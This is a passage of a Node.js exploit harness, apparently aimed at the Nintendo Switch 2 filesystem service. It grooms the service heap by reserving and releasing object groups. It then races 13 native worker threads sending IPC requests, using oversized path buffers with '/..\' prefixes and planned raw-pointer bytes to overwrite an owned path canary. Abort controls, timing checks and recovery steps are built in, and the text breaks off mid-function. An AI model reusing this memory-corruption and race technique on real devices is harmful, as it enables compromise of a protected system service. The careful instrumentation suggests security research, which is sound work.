// Qualify a released reservation group against an owned path canary.
// Receive-buffer extent controls must pass before the optional overwrite trial.
const fs = require('node:fs/promises');
const path = require('node:path');
const crypto = require('node:crypto');
const {performance} = require('node:perf_hooks');
const {connect, check, u64} = require("./session.cjs");
const {RunControl, StopRequested, reportWriter} = require("./run-control.cjs");
const {packPages} = require("./session-tools.cjs");
const {paths, pathPacket, pathPackets} = require("./paths.cjs");
const normalizedPath = require("./normalized-path.cjs");
const {packet, response} = require("../../shared/ipc.cjs");
const functions = require("../../shared/sdk-functions.json");

async function main() {
  // Fixed geometry and bounded attempts from the Switch 2 hardware run.
  const probeReadSize = 0x180000, markerOffset = 0x2340;
  const trialRange = 0x600000, cacheReadSize = 0x200000, fragmentCount = 16;
  const minimumCacheHeld = 0x2810, metadataAttempts = 4, fieldCopies = 2;
  const waveAttempts = 30;
  const plannerCycle = 0x28000;
  const canonicalPlanner = require('./cache-address-plan.cjs');
  const addressPlanner = (target, size) => require('./signed-cache-plan.cjs').plan(target, size, plannerCycle);
  const label = 'reserved-gap-' + Date.now(), file = path.join(__dirname, label + '.json');
  const {s, live, directory} = await connect(label, 0x2400000);
  s.bulkUploads = true;
  s.uploadThreshold = (256);
  const domain = require(path.join(directory, 'domain.cjs'));
  const mounted = require(path.join(directory, 'mounted-save.cjs'));
  const events = require(path.join(directory, 'events.cjs'));
  const timing = require(path.join(directory, 'timing.cjs'));
  const affinity = require(path.join(directory, 'affinity.cjs'));
  const native = require(path.join(directory, 'native-worker.cjs'));
  const bulk = require(path.join(directory, 'bulk-transfer.cjs'));
  const {verifyWorkerCode, code} = require(path.join(directory, 'worker.cjs'));
  const {normal, raw} = paths(s, domain);
  const b = s.base, master = b + 0x3000, holeDone = b + 0x3010, groupReleased = b + 0x3020;
  const guardLaunched = b + 0x3030, spacingDecision = b + 0x2a20;
  const completedFlag = b + 0x2a08, completedDecision = b + 0x2a0c;
  const holeFinished = b + 0x2a10, earlyHole = b + 0x2a14, holeDecision = b + 0x2a18;
  const zeroByte = b + 0x2a1c;
  const gates = [], workers = [], created = [], storages = [];
  const scratch = '/NS2_GAP_' + Date.now(), canary = normalizedPath(scratch + '/canary', 0x5a0);
  const marker = 'SPAN_MARKER', absent = 'SPAN_ABSENT';
  const segments = Array.from({length: 3}, (_, i) => 'S' + i + '_' + Date.now());
  const extent = (0x2440);
  const writeSize = 0x1000000, writeData = b + 0x1000000, output = b + 0xa00000;
  const requests = Array.from({length: 13}, (_, i) => b + 0x10000 + i * 4096);
  const preReleaseBuffer = b + 0x1d000, clearReportBuffer = b + 0x1e000, pinBuffer = b + 0x1f000;
  const triggerInput = b + 0x30000;
  const tailInputs = Array.from({length: 4}, (_, i) => b + 0x32000 + i * 0x2000);
  const report = {session: live.session, scratch, canary, extent, markerOffset,
    probeReadSize, trialRange, cacheReadSize, fragmentCount, minimumCacheHeld,
    metadataAttempts, fieldCopies, waveAttempts, plannerCycle,
    started: new Date().toISOString(), cases: []};
  let saved, temporary, root, fileHandle, group, pinHandle, candidateHandle, originalRom, released = false;
  let cacheNeedsRestore = false, restoreCandidate;
  let addressPlan;
  const save = reportWriter(file, () => ({...report, metrics: s.metrics, retained: {
    base: s.base, bytes: s.bytes, handles: [...s.handles], threads: [...s.threads],
    saved, temporary, root, fileHandle, group, pinHandle, candidateHandle, originalRom, cacheNeedsRestore,
    created, storages, gates, workers, released,
  }}));
  const runControl = new RunControl({id: label, save});
  report.control = runControl.state;
  const call = (offset, args = [0, 0, 0, 0], name) => ({function: live.sdk + offset, args, name});
  const wait = address => call(events.code.wait.offset, [address, 0, 0, 0]);
  const signal = address => call(events.code.signal.offset, [address, 0, 0, 0]);
  const sleep = nanoseconds => call(code.sleep.offset, [nanoseconds, 0, 0, 0]);
  const tick = name => call(timing.code.tick.offset, undefined, name);
  const send = (address, handle, name) => ({...call(functions.send.offset,
    [address, 4096, handle, 0], name), kind: 'ipc'});
  const copyWord = (destination, source, name) => call(0x586fb0, [destination, source, 4, 0], name);
  const setByte = (destination, value, name) => call(functions.memset.offset, [destination, value, 1, 0], name);
  function context(bytes, value = 9) {
    const at = domain.wire.dataStart(bytes);
    bytes.writeUInt32LE((bytes.readUInt32LE() & 0xffff0000) | 6);
    bytes.writeUInt32LE(1, at + 4);
    bytes.writeUInt32LE(value, at + 12);
    return bytes;
  }
  async function clone(handle) {
    return domain.oneHandle(await domain.send(s, 'Clone gap client', handle, domain.wire.control(2)));
  }
  async function put(address, bytes) {
    const aligned = Buffer.alloc(Math.ceil(bytes.length / 4) * 4);
    bytes.copy(aligned);
    await s.write(address, aligned);
    return bytes.length;
  }
  async function memory() {
    let reply;
    for (let i = 0; i < 2; i++) reply = await s.ipc('Read gap allocation counters', root, 1009);
    check(!reply.result, 'Allocation counters failed');
    return Array.from({length: 16}, (_, i) => Number(reply.data.readBigUInt64LE(i * 8)));
  }
  async function reserveGroupAttempt() {
    const owner = await domain.openDomain(s, 'Gap manager group');
    group = {owner, objects: [], rootCopy: null, outer: null};
    group.rootCopy = domain.oneHandle(await domain.copyObject(s, owner, owner.root));
    group.before = await memory();
    // The RPC batches still execute in order. Each request owns a separate
    // page because SendSyncRequest overwrites that page with its response.
    const reservationPages = Buffer.alloc(59 * 4096);
    const managerPacket = domain.wire.domain(owner.root, 1200);
    const addresses = Array.from({length: 59}, (_, i) => b + 0x60000 + i * 4096);
    addresses.forEach((_, i) => managerPacket.copy(reservationPages, i * 4096));
    await s.write(b + 0x60000, reservationPages);
    for (let first = 0; first < addresses.length; first += 32) {
      const batch = addresses.slice(first, first + 32);
      const sent = await s.rpc.batch(batch.map(address => ({fn: live.sdk + functions.send.offset,
        args: [address, 4096, owner.handle]})));
      check(sent.every(reply => reply.result === 0), 'Manager reservation transport failed');
      const received = await s.rpc.batch(batch.map(address => ({read: address, size: 256})));
      for (const bytes of received) {
        check(bytes.bytes.length === 256, 'Short manager reply read');
        const reply = domain.wire.response(bytes.bytes, {domain: true});
        check(!reply.result && reply.objects.length === 1 && !reply.moves.length && !reply.copies.length,
          'Manager reservation failed');
        group.objects.push(reply.objects[0]);
      }
    }
    group.held = await memory();
    const allocated = group.before[5] - group.held[5];
    (report.reservationChecks ||= []).push({before: group.before[5], held: group.held[5], allocated});
    await save();
    if (allocated !== 59 * 208)
      throw Object.assign(Error('Unexpected manager allocation size: ' + allocated), {reservationAccounting: true});
    const converted = await domain.send(s, 'Wrap gap group', owner.handle, domain.wire.control(0));
    check(!converted.result, 'Group wrapping failed');
    group.outer = converted.data.readUInt32LE();
    await s.write(requests[9], domain.wire.closeObject(group.outer));
    const handle = Buffer.alloc(4);
    handle.writeUInt32LE(owner.handle);
    await s.write(b + 0x2a00, handle);
  }
  async function reserveGroup() {
    for (let attempt = 0; attempt < 3; attempt++) {
      try {return await reserveGroupAttempt();}
      catch (error) {
        if (!error.reservationAccounting || attempt === 2) throw error;
        // Nothing in this group has been corrupted, and no worker has started
        // this wave. Release the owned group before measuring a fresh one.
        check(!s.threads.size, 'Cannot retry a reservation while workers are active');
        await closeGroup();
        const observation = report.reservationChecks.at(-1);
        observation.releasedForRetry = true;
        observation.afterRelease = await memory();
        await save();
      }
    }
  }
  async function closeGroup() {
    if (!group) return;
    if (group.outer !== null) {
      await domain.closeObject(s, group.owner, group.outer);
      group.outer = null;
      group.objects.length = 0;
    } else {
      while (group.objects.length) {
        await domain.closeObject(s, group.owner, group.objects.at(-1));
        group.objects.pop();
      }
    }
    for (const handle of [group.rootCopy, group.owner.handle]) if (s.handles.has(handle)) await s.close(handle);
    group = null;
  }

  try {
    await runControl.start();
    console.log(JSON.stringify({stage: 'connected', file, control: runControl.state}));
    await runControl.checkpoint('before setup');
    check(([native.restartAll, native.joinAll, affinity.pinAll].every(fn => typeof fn === 'function')),
      'Current helpers lack batching; bind current helpers or use --serial-host');
    await fs.copyFile(__filename, path.join(__dirname, label + '-source.cjs'));
    for (const helper of ['cache-address-plan.cjs', 'fs-memory-control.cjs', 'session-tools.cjs', 'run-control.cjs', 'capture-workers.cjs', 'native-links.cjs'])
      await fs.copyFile(path.join(__dirname, helper), path.join(__dirname, label + '-' + helper));
    for (const helper of ['native-worker.cjs', 'affinity.cjs'])
      await fs.copyFile(path.join(directory, helper), path.join(__dirname, label + '-' + helper));
    await fs.copyFile(path.join(__dirname, 'cache-address-plan.cjs'), path.join(__dirname, label + '-address-plan-source.cjs'));
    {
      await fs.copyFile(path.join(__dirname, 'signed-cache-plan.cjs'), path.join(__dirname, label + '-signed-plan-source.cjs'));
    }
    await verifyWorkerCode(s);
    await s.verifyCode({offset: 0x586fb0, bytes:
      'e80301cb090940923f0102eb22040054a90700b4ea0301aaeb0300aaa8091037280a0837680000364801403968010039420009cb0800098b2100098b1f0940f2'},
    'Original SDK memcpy used by the native guard');
    await events.verify(s);
    const frequency = await timing.verify(s), mask = await affinity.available(s);
    const cores = Array.from({length: 32}, (_, i) => 1n << BigInt(i)).filter(bit => bit & mask);
    saved = await mounted.cloneMountedFilesystem(s, 'save');
    const capturedMounts = require(path.join(directory, 'mounts.json')).mounts || [];
    const hasTmp = capturedMounts.some(m => m.name === 'tmp');
    temporary = hasTmp ? await mounted.cloneMountedFilesystem(s, 'tmp') : await mounted.cloneMountedFilesystem(s, 'save');
    root = await s.openService('fsp-srv');
    check(!(await s.ipc('Initialize gap root', root, 1, u64(0), {pid: true})).result, 'Root initialization failed');
    {
      await fs.copyFile(path.join(__dirname, 'mounted-rom.cjs'), path.join(__dirname, label + '-mounted-rom-source.cjs'));
      const copied = await require("./mounted-rom.cjs").cloneMountedRom(s, live, directory);
      originalRom = copied.handle;
      report.originalRom = copied.source;
    }
    const mountTargets = hasTmp
      ? [['save', saved, writeSize + 0x400000], ['tmp', temporary, 0x10000]]
      : [['save', saved, writeSize + 0x400000 + 0x10000]];
    for (const [name, handle, bytes] of mountTargets) {
      const space = await normal(handle, 11, '/');
      const free = space.result ? 0n : space.data.readBigUInt64LE();
      (report.freeSpace ||= {})[name] = {result: space.result, bytes: free.toString(), required: bytes};
      if (name === 'tmp' && !space.result && free < BigInt(bytes)) {
        // A low-space result does not establish that our own scratch remains.
        // Inventory the root read-only before deciding what, if anything, is safe to remove.
        try { report.tmpRootEntries = await require(path.join(directory, 'filesystem.cjs')).listDirectory(s, handle, '/'); }
        catch (error) { report.tmpRootReadError = error.message; }
        await save();
      }
      check(!space.result && (name === 'tmp' ? free >= BigInt(bytes) : free > BigInt(bytes)),
        'Insufficient ' + name + ' space');
      check((await normal(handle, 7, scratch)).canonicalResult === 0x202, 'Scratch already exists');
      check(!(await normal(handle, 2, scratch)).result, 'Scratch creation failed');
      created.push({name, handle, path: scratch});
      await save();
    }
    const filename = scratch + '/commit_data';
    check(!(await normal(saved, 0, filename, Buffer.concat([u64(0), u64(writeSize)]))).result, 'Commit file creation failed');
    const parts = canary.slice(1).split('/');
    for (let i = 2; i < parts.length; i++) check(!(await normal(saved, 2,
      '/' + parts.slice(0, i).join('/'))).result, 'Canary parent creation failed');
    check(!(await normal(saved, 0, canary, Buffer.concat([u64(0), u64(1)]))).result, 'Canary creation failed');
    const control = await normal(saved, 7, canary);
    check(!control.result && control.data.readUInt32LE() === 1, 'Canary is not a file');
    report.abortControlResult = (await normal(saved, 7, '')).canonicalResult;
    const selectedDirectory = scratch + '/selected';
    check(!(await normal(saved, 2, selectedDirectory)).result, 'Replacement directory creation failed');
    let markerDirectory = scratch;
    for (const segment of segments) {
      markerDirectory += '/' + segment;
      check(!(await normal(temporary, 2, markerDirectory)).result, 'Extent directory creation failed');
    }
    check(!(await normal(temporary, 0, markerDirectory + '/' + marker,
      Buffer.concat([u64(0), u64(1)]))).result, 'Extent marker creation failed');
    const storage = domain.oneHandle(await s.ipc('Open own gap content', root, 200));
    const storageSize = await domain.storageSize(s, storage);
    check(storageSize >= BigInt(probeReadSize), 'Own content is too small');
    report.storageSize = storageSize.toString();
    if (originalRom) check(await domain.storageSize(s, originalRom) === storageSize, 'Mounted RomFS size differs');
    async function nativeLinks(range) {
      const snapshots = [range, ...(range.fragmentation || [])];
      if (range.beforeReleaseFile) snapshots.unshift({name: 'before-release',
        outputFile: range.beforeReleaseFile, outputSha256: range.beforeReleaseSha256});
      const candidates = await require("./native-links.cjs").findNativeLinks(snapshots, true);
      for (const item of candidates) {
        item.encodable = false;
        try {
          addressPlanner(item.target, Number(storageSize));
          item.encodable = true;
        } catch (error) { item.planError = error.message; }
      }
      return candidates;
    }
    async function prepareAddressControl(evidence, evidenceFile) {
      addressPlan = (require("../retained/lower-window.cjs").lowerWindow(
        Number(evidence.target), Number(storageSize), plannerCycle, report.linkCandidates.map(item => item.target)));
      report.cacheAddress = {evidenceFile: path.resolve(evidenceFile), evidence,
        lowerWindow: addressPlan.lowerWindow,
        encoding: addressPlan.encoding, addressBias: addressPlan.addressBias, arithmetic: addressPlan.arithmetic,
        plannerCycle: addressPlan.cycle, headerFormat: addressPlan.headerFormat || 'original',
        target: addressPlan.target, base: addressPlan.base, entryOffset: addressPlan.entryOffset,
        readOffset: addressPlan.readOffset, header: addressPlan.bytes.toString('hex')};
      // Read the ordinary content before installing a raw pointer. Combined
      // acquisition requalifies the cache alias after these reads.
      await s.call('memset', output, 0xa5, 0x4000);
      const ordinary = await s.ipc('Read the ordinary address-window control', storage, 0,
        Buffer.concat([u64(addressPlan.readOffset), u64(0x4000)]),
        {receive: [{address: output, size: 0x4000, mode: 1}]});
      check(!ordinary.result, 'Ordinary address-window control failed');
      report.cacheAddress.controlFile = path.join(__dirname, label + '-address-control.bin');
      await fs.writeFile(report.cacheAddress.controlFile, await s.readOwned(output, 0x4000), {mode: 0o600});
      {
        await s.call('memset', output, 0xa5, 16);
        const period = await s.ipc('Read the ordinary bucket-period control', storage, 0,
          Buffer.concat([u64(0x28000), u64(16)]), {receive: [{address: output, size: 16, mode: 1}]});
        check(!period.result, 'Ordinary bucket-period control failed');
        report.cacheAddress.periodControlHex = (await s.readOwned(output, 16)).toString('hex');
      }
    }
    const clients = [await clone(saved), storage];
    for (let i = 0; i < 4; i++) clients.push(await clone(root));
    for (let i = 0; i < 3; i++) clients.push(await clone(saved));
    clients.push({u32: b + 0x2a00}, await clone(saved), await clone(saved), {u32: b + 0x2a04});
    const savedTrigger = await clone(saved), tmpTrigger = await clone(temporary);
    for (const gate of [master, holeDone, groupReleased, guardLaunched]) {
      await events.initialize(s, gate);
      gates.push(gate);
    }
    await s.call('memset', writeData, 0x66, writeSize);
    const canarySize = await put(b + 0x40000, Buffer.from(canary + '\0'));
    const guard = normalizedPath(scratch + '/absent', 0x300);
    for (let i = 0; i < 2; i++) await put(b + 0x42000 + i * 4096,
      Buffer.from((i ? guard.slice(0, -1) + 'C' : guard) + '\0'));
    const guardRequest = pathPackets(5, Buffer.alloc(0), [0, 1].map(i =>
      ({address: b + 0x42000 + i * 4096, size: 0x301})));
    await put(b + 0x45000, Buffer.from('/NS2_SRC00000000'));
    await put(b + 0x46000, Buffer.from(normalizedPath(scratch + '/page_absent', 0x7ef) + '\0'));
    const fillerRequest = pathPackets(5, Buffer.alloc(0),
      [{address: b + 0x45000, size: 16}, {address: b + 0x46000, size: 0x7f0}]);
    for (const bytes of [guardRequest, fillerRequest]) check((await domain.send(s,
      'Ordinary gap path control', saved, bytes)).canonicalResult === 0x202, 'Path control differs');
    for (let i = 0; i < 1; i++) storages.push(domain.oneHandle(
      await s.ipc('Reserve own gap content ' + i, root, 200)));
    const roles = ['commit', 'hole', 'tail0', 'tail1', 'tail2', 'tail3', 'canary',
      'filler0', 'filler1', 'release', 'guard0', 'guard1', 'trigger'];
    const delays = ([0, 300000, 350000, 450000, 550000, 650000, 1700000, 2000000, 2150000, 2800000]);
    report.workerDelaysNs = delays;
    const plans = roles.map((role, i) => {
      const steps = [wait(master)];
      if (i < 10) steps.push(sleep(delays[i]));
      else if (i < 12) steps.push(wait(groupReleased), sleep((i - 10) * 150000));
      else steps.push(sleep(2400000), wait(groupReleased), wait(guardLaunched), sleep(400000),
        copyWord(spacingDecision, holeFinished, 'sampleMinimumSpacing'), wait(holeDone));
      if (i === 9) steps.push(tick('pinStart'), send(pinBuffer, root, 'pin'), tick('pinEnd'));
      if (i === 9) steps.push(tick('clearStart'), send(clearReportBuffer, root, 'clearReport'), tick('clearEnd'),
        tick('memoryStart'), send(preReleaseBuffer, root, 'preRelease'), tick('memoryEnd'));
      if (i === 11) steps.push(copyWord(earlyHole, holeFinished, 'sampleReceiveOrder'), signal(guardLaunched));
      if (i === 12) steps.push(copyWord(completedDecision, completedFlag, 'sampleCompleted'),
        copyWord(holeDecision, earlyHole, 'sampleEarlyHole'),
        // A zero-length copy preserves the payload. A one-byte copy makes
        // it an ordinary empty path before the kernel receives the buffer.
        call(0x586fb0, [triggerInput, zeroByte, {u32: completedDecision}, 0], 'abortCompleted'),
        call(0x586fb0, [triggerInput, zeroByte, {u32: holeDecision}, 0], 'abortEarlyHole'),
        call(0x586fb0, [triggerInput, zeroByte, {u32: spacingDecision}, 0], 'abortMinimumSpacing'));
      steps.push(tick('start'), send(requests[i], clients[i], role), tick('end'));
      if (i === 1) steps.push(setByte(holeFinished, 1, 'holeFinished'), signal(holeDone));
      if (i === 9) steps.push(signal(groupReleased));
      if (i === 0 || i >= 2 && i <= 8 || i === 10 || i === 11)
        steps.push(setByte(completedFlag, 1, 'protectedRequestFinished'));
      return steps;
    });

    async function wave(profile, readSize, customPayload = null) {
      await runControl.begin(profile);
      const hostStarted = performance.now(), hostRequests = s.metrics.requests;
      const createPin = (!pinHandle);
      released = false;
      for (const gate of gates) await events.clear(s, gate);
      await s.write(completedFlag, Buffer.alloc(32));
      if (profile === 'abort-control') await s.write(completedFlag, Buffer.from([1, 0, 0, 0]));
      if (profile === 'abort-hole-control') await s.write(holeFinished, Buffer.from([1, 0, 0, 0]));
      fileHandle = domain.oneHandle(await normal(saved, 8, filename, Buffer.from([3, 0, 0, 0])));
      check(!(await s.ipc('Dirty gap commit data', fileHandle, 1,
        Buffer.concat([u64(0), u64(0), u64(writeSize)]),
        {send: [{address: writeData, size: writeSize, mode: 1}]})).result, 'Scratch write failed');
      await s.close(fileHandle);
      fileHandle = null;
      const payload = customPayload ? Buffer.from(customPayload) : Buffer.alloc(extent + 1, '/');
      payload[payload.length - 1] = 0;
      const isExtent = profile.startsWith('extent-');
      const isPositive = ['positive', 'binary-control', 'address-encoding-control'].includes(profile) || profile.startsWith('locate-');
      if (customPayload) {
        check(payload.subarray(0, 4).equals(Buffer.from('/..\\')), 'Custom copy prefix differs');
        check(!payload.subarray(0, -1).includes(0), 'Custom copy has an embedded terminator');
      } else if (isExtent) {
        payload.write(scratch + '/');
        for (let i = 0; i < segments.length; i++) payload.write('/' + segments[i] + '/', (i + 1) * 0x800);
        const basename = profile === 'extent-present' ? marker : absent;
        payload.write(basename, extent - basename.length);
      } else {
        if (isPositive) {
          payload.fill('B', 0, extent);
          payload.write(selectedDirectory, markerOffset);
          payload.fill('/', markerOffset + selectedDirectory.length, extent);
        }
        payload.write(isPositive ? '/..\\' : '/../');
        if (profile === 'address-encoding-control') addressPlan.writes[0].bytes.copy(payload, 0x100);
      }
      const pieces = [];
      for (let at = 0; at < payload.length; at += 0x800) pieces.push(payload.subarray(at, at + 0x800));
      check(pieces.length === 5, 'Unexpected receive extent');
      await s.measure('inputs:' + profile, async () => {
        await put(triggerInput, pieces[0]);
        for (let i = 0; i < 4; i++) await put(tailInputs[i], pieces[i + 1]);
        const reads = pieces.map((bytes, i) => ({address: i === 0 ? triggerInput : tailInputs[i - 1], bytes: bytes.length}));
        const actual = (await s.readOwnedMany(reads));
        actual.forEach((bytes, i) => check(bytes.equals(pieces[i]), 'Native input piece differs: ' + i));
      });
      const triggerHandle = Buffer.alloc(4);
      triggerHandle.writeUInt32LE(isExtent ? tmpTrigger : savedTrigger);
      await s.write(b + 0x2a04, triggerHandle);
      if (!group) await s.measure('reservation:' + profile, reserveGroup);
      const packets = [packet(10), packet(0, Buffer.concat([u64(0), u64(readSize)]),
        {receive: [{address: output, size: readSize, mode: 1}]})];
      for (let i = 0; i < 4; i++) packets.push(pathPacket(1002, Buffer.alloc(0), tailInputs[i], pieces[i + 1].length));
      packets.push(pathPacket(7, Buffer.alloc(0), b + 0x40000, canarySize), Buffer.from(fillerRequest),
        Buffer.from(fillerRequest), null, Buffer.from(guardRequest), Buffer.from(guardRequest),
        pathPacket(7, Buffer.alloc(0), triggerInput, 0x800));
      await s.measure('requests:' + profile, async () => {
        const writes = packets.flatMap((bytes, i) => bytes ? [{address: requests[i],
          bytes: context(bytes, i === 0 || i >= 2 && i < 6 ? 3 : 9)}] : []);
        writes.push({address: requests[9], bytes: domain.wire.closeObject(group.outer)},
          {address: preReleaseBuffer, bytes: context(packet(1009))},
          {address: clearReportBuffer, bytes: context(packet(1009))});
        writes.push({address: pinBuffer, bytes: context(packet(createPin ? 200 : 1009))});
        await s.write(requests[0], packPages(requests[0], 16 * 4096, writes));
      });
      await s.measure('workers:' + profile, async () => {
        if ((workers.length === plans.length)) await native.restartAll(s, workers);
        else for (let i = 0; i < plans.length; i++) {
          workers[i] = workers[i] ? await native.restart(s, workers[i]) : await native.start(s,
            b + 0x100000 + i * 0x40000, 0x40000, b + 0x2000 + i * 16, plans[i],
            label + '-' + i, b + 0x500000 + i * 0x40000);
        }
        await affinity.pinAll(s, workers, workers.map((_, i) => cores[i % cores.length]));
      });
      report.active = {profile, readSize};
      await save();
      console.log(JSON.stringify({stage: 'prepared', ...report.active, file}));
      released = true;
      await events.signal(s, master);
      await s.measure('join:' + profile, async () => {
        await native.joinAll(s, workers);
      });
      const firstIpc = workers[0].calls.findIndex(step => step.kind === 'ipc');
      const origin = workers[0].results[firstIpc - 1], rows = [];
      const ipcSteps = workers.flatMap(worker => worker.calls.flatMap((step, index) =>
        step.kind === 'ipc' ? [{worker, step, index}] : []));
      const replies = (await s.measure('replies:' + profile, () =>
        s.readOwnedMany(ipcSteps.map(({step}) => ({address: step.args[0], bytes: 256})))));
      for (const [replyIndex, {worker, index, step}] of ipcSteps.entries()) {
        check(worker.results[index] === 0n, 'Native gap transport failed at ' + step.name);
        const bytes = (replies[replyIndex]);
        const reply = step.name === 'release' ? null : response(bytes);
        if (step.name === 'pin' && createPin) {
          check(!reply.result && reply.moves.length === 1 && !reply.copies.length, 'Pinning storage did not open');
          pinHandle = reply.moves[0];
          s.handles.add(pinHandle);
          report.pinHandle = pinHandle;
        }
        rows.push({role: step.name, result: reply ? reply.canonicalResult : 0,
          inline: reply ? reply.data.subarray(0, 16).toString('hex') : bytes.subarray(0, 32).toString('hex'),
          memory: step.name === 'preRelease' ? Array.from({length: 16}, (_, i) => Number(reply.data.readBigUInt64LE(i * 8))) : undefined,
          startUs: Number(worker.results[index - 1] - origin) * 1e6 / frequency,
          endUs: Number(worker.results[index + 1] - origin) * 1e6 / frequency});
      }
      group.outer = null;
      group.objects.length = 0;
      const after = await memory(), trigger = rows.find(row => row.role === 'trigger');
      const heldPaths = rows.filter(row => ['canary', 'filler0', 'filler1', 'guard0', 'guard1'].includes(row.role));
      const beforeRelease = rows.find(row => row.role === 'preRelease');
      const canaryRow = rows.find(row => row.role === 'canary');
      const guardBytes = await s.readOwned(completedFlag, 32);
      const nativeGuard = {completed: guardBytes.readUInt32LE(completedDecision - completedFlag),
        earlyHole: guardBytes.readUInt32LE(holeDecision - completedFlag),
        minimumSpacing: guardBytes.readUInt32LE(spacingDecision - completedFlag)};
      const row = {profile, readSize, extent: payload.length - 1, rows,
        nativeGuard, triggerAborted: Boolean(nativeGuard.completed || nativeGuard.earlyHole || nativeGuard.minimumSpacing),
        receiveOrderMarginUs: rows.find(r => r.role === 'hole').endUs - rows.find(r => r.role === 'guard1').startUs,
        preReleaseUsed: group.held[5] - beforeRelease.memory[5],
        restored: after[5] + (createPin ? 13616 : 0) === group.before[5], baseline: group.before[5], after: after[5],
        newPersistentBytes: createPin ? group.before[5] - after[5] : 0,
        allPending: (isExtent && hasTmp)
          ? [...heldPaths, ...rows.filter(r => r.role.startsWith('tail') || r.role === 'commit')].every(
              r => r.startUs < trigger.startUs && trigger.endUs < r.endUs)
          : [...heldPaths, ...rows.filter(r => r.role.startsWith('tail') || r.role === 'commit')].every(
              r => r.startUs < trigger.startUs) &&
            heldPaths.every(r => trigger.startUs < r.endUs) &&
            rows.filter(r => r.role.startsWith('tail') || r.role === 'commit').every(
              r => trigger.endUs < r.endUs),
        selectedMarker: trigger.result === 0 && Buffer.from(trigger.inline, 'hex').readUInt32LE() === 1,
        changedPaths: heldPaths.filter(r => r.result !== (r.role === 'canary' ? 0 : 0x202) ||
          r.role === 'canary' && Buffer.from(r.inline, 'hex').readUInt32LE() !== 1).map(r => r.role),
        canaryResult: canaryRow.result,
        canaryType: canaryRow.result ? null : Buffer.from(canaryRow.inline, 'hex').readUInt32LE()};
      report.cases.push(row);
      delete report.active;
      await save();
      console.log(JSON.stringify(row));
      if (candidateHandle && !row.restored) {
        report.placementUncertain = true;
        report.heapDrift = {profile, expected: row.baseline, observed: row.after,
          difference: row.after - row.baseline};
        await save();
        throw Error('General-heap allocation changed while the cache was retained; stop overwrites and recover');
      }
      if ((isPositive || customPayload) && !row.triggerAborted && !row.allPending) {
        report.placementUncertain = true;
        await save();
        throw Error('A protected request ended during the overwrite; retain resources for recovery');
      }
      await closeGroup();
      if (createPin) {
        const pinRow = rows.find(r => r.role === 'pin');
        check(canaryRow.startUs < pinRow.startUs && pinRow.endUs < canaryRow.endUs,
          'Pinning storage was not created while the canary was pending');
        check(row.newPersistentBytes === 13616, 'Pinning allocation cost changed');
      }
      check(rows.find(r => r.role === 'pin').result === 0, 'Pinning request failed');
      check(rows.filter(r => ['commit', 'hole', 'clearReport', 'preRelease'].includes(r.role)).every(r => r.result === 0), 'Ordinary gap request failed');
      check(rows.filter(r => r.role.startsWith('tail')).every(r => r.result === 0x320002), 'Deferred seed result differs');
      check(rows.filter(r => r.role.startsWith('guard')).every(r => r.result === 0x202), 'Guard result differs');
      check(rows.filter(r => r.role.startsWith('filler')).every(r => r.result === 0x202 ||
        (isPositive || customPayload) && r.result === 0x2eea02), 'Unexpected filler result');
      const metadataCanaryMiss = customPayload && row.changedPaths.length === 1 &&
        row.changedPaths[0] === 'canary' && canaryRow.result === 0x2eea02;
      // A metadata copy can land on the still-owned path canary. Let the
      // caller retry this measured miss after checking the file below.
      if (!isPositive && !metadataCanaryMiss)
        check(!canaryRow.result && row.canaryType === 1, 'Control changed the canary');
      if (row.triggerAborted) check(trigger.result === report.abortControlResult, 'Native abort differs from the empty-path control');
      else if (profile === 'binary-control') check([0x2eea02, 0x2eec02].includes(trigger.result), 'Unexpected binary-path result');
      else if (!isExtent) check(trigger.result === 0x2eec02, 'Backslash control result differs');
      const health = await normal(saved, 7, canary);
      check(!health.result && health.data.readUInt32LE() === 1, 'Canary file changed on disk');
      row.host = {elapsedMs: performance.now() - hostStarted, requests: s.metrics.requests - hostRequests};
      await s.record({operation: 'waveTiming', profile, ...row.host,
        nativeElapsedMs: Math.max(...rows.map(row => row.endUs)) / 1000});
      await runControl.end(profile);
      return row;
    }

    const hasWindow = row => row.restored && !row.triggerAborted && row.allPending && row.receiveOrderMarginUs >= 300 &&
      row.preReleaseUsed >= 0x2600;
    async function retryWave(profile) {
      let row;
      for (let attempt = 0; attempt < waveAttempts; attempt++) {
        row = await wave(profile, probeReadSize);
        if (!hasWindow(row)) continue;
        if (profile === 'extent-present' && !row.selectedMarker) continue;
        if (profile === 'positive') {
          const matched = row.canaryType === 0 && row.changedPaths.every(name => name === 'canary');
          if (!matched && attempt < waveAttempts - 1) continue;
        } else if (profile === 'address-encoding-control') {
          if (row.canaryResult === 0 && row.canaryType === 1 &&
              row.changedPaths.every(name => ['filler0', 'filler1', 'guard0', 'guard1'].includes(name))) continue;
        }
        break;
      }
      return row;
    }
    async function checkExtent() {
      const row = await retryWave('extent-present');
      check(row.selectedMarker && hasWindow(row), 'The interleaved input extent did not requalify');
    }

    let abortControl;
    for (let attempt = 0; attempt < 5; attempt++) {
      try {
        abortControl = await wave('abort-control', probeReadSize);
        check(abortControl.triggerAborted && abortControl.nativeGuard.completed === 1, 'Native abort control failed');
        break;
      } catch (err) {
        if (attempt === 4) throw err;
        if (pinHandle) {
          try {
            await s.close(pinHandle);
            s.handles.delete(pinHandle);
            pinHandle = null;
          } catch {}
        }
      }
    }
    const holeAbortControl = await wave('abort-hole-control', probeReadSize);
    check(holeAbortControl.triggerAborted && holeAbortControl.nativeGuard.earlyHole === 1 &&
      holeAbortControl.nativeGuard.minimumSpacing === 1, 'Native receive-order abort failed');
    await wave('extent-absent', probeReadSize);
    const result = await retryWave('extent-present');
    const qualified = result.selectedMarker && hasWindow(result) ? probeReadSize : null;
    report.qualifiedReadSize = qualified || null;
    if (qualified) {
      const control = await retryWave('negative');
      if (hasWindow(control)) {
        const positive = await retryWave('positive');
        report.canaryChanged = positive.changedPaths.includes('canary') && positive.allPending &&
          positive.receiveOrderMarginUs >= 300;
        report.markerSelected = (report.canaryChanged) && positive.canaryType === 0 &&
          positive.changedPaths.every(name => name === 'canary') && hasWindow(positive);
        if ((!positive.triggerAborted) && !report.markerSelected) {
          report.placementUncertain = true;
          await save();
          throw Error('Overwrite missed the qualified canary; retain resources for recovery');
        }
        // The locator already traversed and checked the full input extent.
        // Keep its allocation sequence intact through the directory controls.
        await checkExtent();
        if ((report.markerSelected)) {
          const repeated = await retryWave('positive');
          report.markerReproduced = repeated.canaryType === 0 &&
            repeated.changedPaths.every(name => name === 'canary') && hasWindow(repeated);
          if (!repeated.triggerAborted && !report.markerReproduced) {
            report.placementUncertain = true;
            await save();
